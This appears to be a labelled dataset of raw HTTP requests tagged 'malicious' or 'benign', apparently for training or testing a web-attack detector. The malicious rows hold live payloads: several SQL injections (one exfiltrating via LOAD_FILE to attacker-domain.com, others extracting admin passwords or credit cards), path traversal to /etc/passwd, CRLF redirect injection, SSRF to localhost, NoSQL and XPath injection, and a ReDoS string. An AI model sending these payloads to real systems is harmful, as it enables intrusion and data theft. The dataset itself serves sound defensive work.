label,text
malicious,"POST /user/profile/update HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/account/settings
Cookie: session_token=f3ad92b4c1e547a1b8c7cd1f7ec3a9e2

displayName=John+Doe&preferences%5Btheme%5D=dark&role_id=1&internal_user_status=ACTIVE"
malicious,"GET /app/profile/info?id=%2527%2520OR%2520%2528SELECT%2520LOAD_FILE%2528CONCAT%2528%2527%255C%255C%255C%255C%2527%252C%2528SELECT%2520version%2528%2529%2529%252C%2527.attacker-domain.com%255C%255Cdata%2527%2529%2529%2529--%2520 HTTP/1.1
Host: user-access-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: sessionId=9f1bcd768e4a72f3b1d2e4c4d29a7f32; authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.aGVsbG8=.abc123
Referer: https://user-access-portal.net/app/dashboard
Cache-Control: no-cache"
malicious,"GET /file?data=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afetc%c0%afpasswd HTTP/1.1
Host: enterprise-cloud-solutions.ai
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Charset: utf-8, iso-8859-1;q=0.5
Accept-Language: en-US,en;q=0.9
Referer: https://enterprise-cloud-solutions.ai/api-docs
Connection: keep-alive"
benign,"GET /articles/health/benefits-of-yoga HTTP/1.1
Host: holistic-wellness-hub.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /service/feedback/submit HTTP/1.1
Host: user-feedback-hub.org
Authorization: Bearer ZxcvbnMASDQ12309876
Content-Type: application/json
Accept: application/json, text/plain
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Length: 98

{""feedback.message"": ""The new update is fantastic!"",""user-id"": ""u_78392"",""feedback-rating"": 5,""metadata[platform]"": ""web""}"
benign,"POST /account/login HTTP/1.1
Host: login.my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Length: 41
Connection: keep-alive

username=emily_davis&password=securePass123!&remember_me=1"
benign,"GET /attachment/getfile?file=report-final.pdf HTTP/1.1
Host: community.forum-files.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1
Accept: application/pdf
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://community.forum-files.org/thread/3456"
benign,"POST /account/login HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
User-Agent: python-requests/2.31.0
Accept: */*
X-CSRF-Token: r3j8kx1bsz4io12vgnc5yqz7
Connection: keep-alive

username=blogger_jack&password=SecurePass789&session_info=%3Csession%3E%3Cip%3E203.0.113.45%3C%2Fip%3E%3Clogin_time%3E2024-06-01T09:21:45Z%3C%2Flogin_time%3E%3C%2Fsession%3E"
benign,"POST /api/v3/upload/avatar HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer mF_9.B5f-4.1JqM
Content-Type: application/json
Accept: application/json
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Content-Length: 193
Connection: keep-alive

{""username"":""jane_doe"",""avatar_b64"":""iVBORw0KGgoAAAANSUhEUgAAABkAAAAVCAYAAAAB4HyQAAAAGXRFWHRTb2Z0d2FyZQBwYWludC5uZXQgNC4wLjE2Q1VTNu4ZKgAAAIdJREFUSMfNkkEOgjAMRX+P9fTnuDyLFpW+wqt6QuSmM1ALSXuxsmIdMk8H9MiTkqa2ouT3b5kiA45LyvmZUoOZyAGIkcGq77HZicYEPCSnm3AESn7ttNSNFRC3nHAiF8ab4tWSIr8Wtw1pCPMeiiPbY8jqDXBRYVOIctX1/nvNImYAv+sF+hH8AmJQY0gUCMQDHWaLxwCgbaN1/iFoo0HaCwAAAABJRU5ErkJggg=="",""meta"":{""uploadedAt"":""2024-06-07T08:55:12Z""}}"
malicious,"POST /api/v1/cart/update HTTP/1.1
Host: api.global-shoppinghub.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Referer: https://global-shoppinghub.io/cart
Cookie: tracking_id=def456'/**/OR/**/IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61, SLEEP(5),0)#; session=abcd123efg456

item_id=682&quantity=2"
benign,"GET /api/v3/items/search?filter=active&pageToken=QUJDREVGR0hJSg== HTTP/1.1
Host: cloud-data-services.ai
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /account/update-profile HTTP/1.1
Host: user-dashboard-portal.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Origin: https://user-dashboard-portal.io
Referer: https://user-dashboard-portal.io/account/settings
Cookie: session_id=abc123def4567890xyz

first_name=Laura&last_name=&email=laura.jones%40mailservice.com"
benign,"GET /api/device/serial-9087.xml HTTP/1.1
Host: iot-device-manager.org
Accept: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Authorization: ApiKey 7f6e3d2c4b1a58902efghjk345lmnopq
DNT: 1
Referer: https://dashboard.iot-device-manager.org/devices"
benign,"GET /docs/swagger/v1.json HTTP/1.1
Host: healthdata-securehub.org
Accept: application/json
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip, deflate
Via: 1.1 varnish"
benign,"GET /api/v1/orders/recent?limit=50 HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
Referer: https://user-profile.online-retail-store.biz/account/dashboard
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ29vZGlldCIsImlhdCI6MTY4MTA4MTUyMH0.pZmRzDhPsqgbP8clTuK0z6i5A8HKWizJv4AqkxTmR3c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET / HTTP/1.1
Host: insights-data-aggregator.ai
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /gallery/photos/holiday-2022/album2 HTTP/1.1
Host: family-memories-photoarchive.info
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: close"
benign,"OPTIONS /manager/v2/accounts/7821 HTTP/1.1
Host: api.enterprise-finance.net
Origin: https://admin.financeportal.ai
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: */*
Connection: close"
benign,"GET /public/images/products/new-arrivals/camping-gear-set.jpg HTTP/1.1
Host: outdoor-life-equipment.store
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: https://outdoor-life-equipment.store/products/new-arrivals
User-Agent: python-requests/2.31.0
Connection: keep-alive"
benign,"POST /account/forgot_password HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 41
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/account/login
Connection: keep-alive
Accept-Language: en-US,en;q=0.9

email=samuel.bryant%40shoponline.biz"
benign,"GET /management/accounts?filter[type]=admin&filter[active]=true HTTP/1.1
Host: my-company-admin.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
X-CSRF-Token: 5f9d8b4e26f4a1c3a7b7e77d622f420f
Referer: https://my-company-admin.org/login"
benign,"GET /forum/threads/view/45892?sort=latest&filter=unread&highlight_user=chris24&show_signature=true&include_attachments=false&page=1&per_page=25&lang=en-US&theme=dark&show_online_status=true HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive
Pragma: no-cache"
benign,"POST /rest/api/v4/employee/update HTTP/1.1
Host: corp-internal-exchange.net
Authorization: Bearer 5b1d81f2-aa32-486a-b788-94df830a1a2c
Content-Type: application/json
Content-Length: 116
X-Request-ID: 5bb1f3a7-0f3c-43d0-8bfd-4d0bcc9c4f0a
Idempotency-Key: 1d64efb7-4c18-4e2f-acc8-42dc4ac943e4
X-Client-Version: 10.8.2
Via: 1.1 internal-proxy
Accept: application/json
User-Agent: python-requests/2.31.0

{""employeeId"":4598,""status"":""active"",""department"":""engineering"",""location"":""building 5, floor 3""}"
benign,"GET /media/ui/svg/logo-brand.svg HTTP/1.1
Host: cloud-storage-hub.io
Accept: image/svg+xml
Referer: https://cloud-storage-hub.io/login
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Connection: keep-alive"
benign,"OPTIONS /admin/v2/customers/4507 HTTP/1.1
Host: online-retail-store.biz
Origin: https://retail-analytics.panel
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, x-auth-token
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /events/upcoming?date=2024-07-20&date=2024-07-21&category=music&category=outdoor HTTP/1.1
Host: urban-arts-center.net
Accept: text/html
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36"
benign,"POST /api/v1/submit_feedback HTTP/1.1
Host: appdata-securecloud.ai
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json
Origin: https://appdata-securecloud.ai
X-CSRF-Token: 5f2037bbd1238a8fbbde12c22a9d09f6
Cookie: token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9

user=alice&feedback=VGhlIGFwcCBpcyB2ZXJ5IHVzZWZ1bCBhbmQgbG93IGxhdGVuY3ksIGFwccmlaXNlLg=="
benign,"GET /events?date=2024-07-04&location=San+Francisco+%26+Oakland HTTP/1.1
Host: community-event-hub.org
Accept: text/html,application/xhtml+xml
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Referer: https://community-event-hub.org/events/calendar
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0
Connection: keep-alive"
malicious,"POST /cart/update HTTP/1.1
Host: rapid-deals-store.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Cookie: session_id=de8f918c7bd32a1e3ab345f2c470d42c; tracking_id=ghp' OR /*!*/IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#; preferred_currency=USD
Cache-Control: no-cache

product_id=34&quantity=1"
benign,"GET /research/papers/2023/ai-ethics.html HTTP/1.1
Host: institute-innovation-research.edu
Connection: keep-alive
If-Modified-Since: Thu, 15 Jun 2023 16:45:00 GMT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Referer: https://institute-innovation-research.edu/research/papers/
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
benign,"GET /robots.txt HTTP/1.1
Host: cloud-app-services.us
User-Agent: DataAnalyticsBot/0.9 (+http://dataanalyticsbot.cloud)
Accept-Encoding: gzip
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
malicious,"POST /api/v2/user/redirect HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 248
Connection: keep-alive
Origin: https://secure-user-portal.net
Referer: https://secure-user-portal.net/app/login
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123xyz

{""redirect_url"": ""/dashboard%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://malicious-redirect.biz%0d%0a%0d%0a<html><body>You've been redirected</body></html>""}"
malicious,"POST /api/v3/data/fetch HTTP/1.1
Host: data-fetcher.enterprise-solutions.biz
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Language: en-US,en;q=0.5
Referer: https://data-fetcher.enterprise-solutions.biz/dashboard
Content-Length: 92

{""endpoint"":""http://0x7f000001/api/internal/config?format=json&debug=true""}"
benign,"POST /chat/send-message HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: curl/7.88.1
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 33
Connection: close

message=run_launch_sequence&thread=489"
benign,"POST /api/v4/external-js/load HTTP/1.1
Host: realtime-interaction.app
Content-Type: application/javascript
User-Agent: curl/7.79.1
Content-Length: 39
Accept: */*
Origin: https://realtime-interaction.app

console.log('External JS snippet executed');"
malicious,"POST /v1/input/pattern-check HTTP/1.1
Host: analytics.validation-hub.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 184
Referer: https://portal.analytics.validation-hub.net
Cache-Control: no-cache
Pragma: no-cache
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Safari"";v=""14"", ""Chromium"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"GET /api/users/lookup?account%5B%24regex%5D=%5Eadm.* HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"GET /api-docs HTTP/1.1
Host: user-management-api.devtools.app
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Connection: close"
malicious,"GET /products/list?filter=active&filter=popular&id=123&filter_evil_chars=true&id=%27%20UNION%20SELECT%20credit_card%20FROM%20users-- HTTP/1.1
Host: urban-marketplace.store
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache
Referer: https://urban-marketplace.store/dashboard
Connection: keep-alive"
benign,"GET /api/v2/inventory/item/4917f9ac23 HTTP/1.1
Host: market-data-exchange.org
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, br
Referer: https://market-data-exchange.org/dashboard
Connection: keep-alive"
benign,"GET /downloads/tutorials/programming_fundamentals.pdf HTTP/1.1
Host: techlearning-platform.net
Referer: https://techlearning-platform.net/courses/intro-to-coding
Accept: application/pdf
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /news/automotive/electric-cars/comparisons?year=2024 HTTP/1.1
Host: motorist-review.net
User-Agent: Mozilla/5.0 (Linux; Android 10; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml
Accept-Language: en-GB,en;q=0.8
Referer: https://motorist-review.net/news/automotive
Connection: close"
benign,"GET /forums/thread/view?id=9823&title=Understanding+John%27s+perspective+on+privacy+%26+security HTTP/1.1
Host: community.techforumx.ai
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:113.0) Gecko/20100101 Firefox/113.0
Accept: */*
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive"
malicious,"GET /api/v2/search/9' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e,(SELECT CONCAT_WS(':',USER(),DATABASE())),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/results HTTP/1.1
Host: api.cloud-data-services.ai
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.7
Referer: https://api.cloud-data-services.ai/search
User-Agent: Python-urllib/3.9"
benign,"GET /media/scripts/map-interactions.min.js HTTP/1.1
Host: travel-horizons.net
User-Agent: Go-http-client/1.1
Accept: application/javascript, */*;q=0.1
Accept-Language: en-US,en;q=0.8
If-None-Match: ""a7b3c5d7f9""
Connection: keep-alive"
benign,"POST /api/v1/send-command HTTP/1.1
Host: remote-admin-console.tech
User-Agent: python-requests/2.31.0
Content-Type: application/json
Accept: application/json
Authorization: Basic YWRtaW46c2VjdXJlMTIz
Content-Length: 41
Connection: keep-alive

{""command"":""restart_service"",""service_name"":""webproxy""}"
malicious,"POST /webhook/notify HTTP/1.1
Host: dev-gateway.fakecorp.io
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close

payload=update&status=success"
benign,"POST /v3/password/reset/request HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Referer: https://community.game-dev-forum.org/account/forgot-password
DNT: 1
Content-Length: 55

{""email"":""anna.kapoor@community.game-dev-forum.org""}"
benign,"POST /password/reset HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Referer: https://secure-user-portal.net/login

email=amelia.santos%40securemail.com"
malicious,"POST /api/v2/search/items HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/xml
Content-Length: 122
Connection: keep-alive

<searchRequest>
  <term>' or //node() or '</term>
  <category>technology</category>
</searchRequest>"
benign,"GET /products/office/chairs HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Cookie: cart_id=3761af28; user_sess=421f9d877a; last_visited=2024-05-22T16%3A20%3A42Z
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36"
benign,"POST /services/api/v1/scripts/realtime-update.js HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.2
Content-Type: application/javascript
Content-Length: 36
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: keep-alive

console.log('Realtime update script ready');"
